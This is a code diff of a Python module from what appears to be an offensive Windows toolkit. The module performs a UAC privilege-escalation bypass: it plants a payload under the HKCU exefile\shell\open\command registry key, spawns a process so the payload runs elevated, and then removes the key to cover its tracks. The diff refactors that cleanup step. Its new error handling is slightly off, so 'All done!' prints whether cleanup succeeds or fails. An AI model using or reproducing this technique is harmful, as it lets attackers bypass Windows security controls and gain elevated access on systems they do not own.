@@ -16,6 +16,14 @@ slui_info = {
 }
 
 
+def	slui_cleanup(path):
+	print_info("Performing cleaning")
+	if registry().remove_key(hkey="hkcu", path=path, name=None, delete_key=True):
+		print_success("Successfully cleaned up")
+	else:
+		print_error("Unable to cleanup")
+		return False
+
 def slui(payload):
 	if payloads().exe(payload):
 		path = "Software\\Classes\\exefile\\shell\\open\\command"
@@ -25,7 +33,8 @@ def slui(payload):
 				print_success("Successfully created Default and DelegateExecute key containing payload ({payload})".format(payload=os.path.join(payload)))
 			else:
 				print_error("Unable to create registry keys")
-				return False
+				if "error" in Constant.output:
+					slui_cleanup(path)
 		else:
 			print_error("Unable to create registry keys")
 			return False
@@ -39,15 +48,13 @@ def slui(payload):
 				print_success("Successfully spawned process ({})".format(os.path.join(payload)))
 			else:
 				print_error("Unable to spawn process ({})".format(os.path.join(payload)))
-				return False
-	
+				if "error" in Constant.output:
+					slui_cleanup(path)
+
 		time.sleep(5)
 
-		if registry().remove_key(hkey="hkcu", path=path, name=None, delete_key=True):
-			print_success("Successfully cleaned up, enjoy!")
-		else:
-			print_error("Unable to cleanup")
-			return False
+		if not slui_cleanup(path):
+			print_success("All done!")
 	else:
 		print_error("Cannot proceed, invalid payload")
 		return False
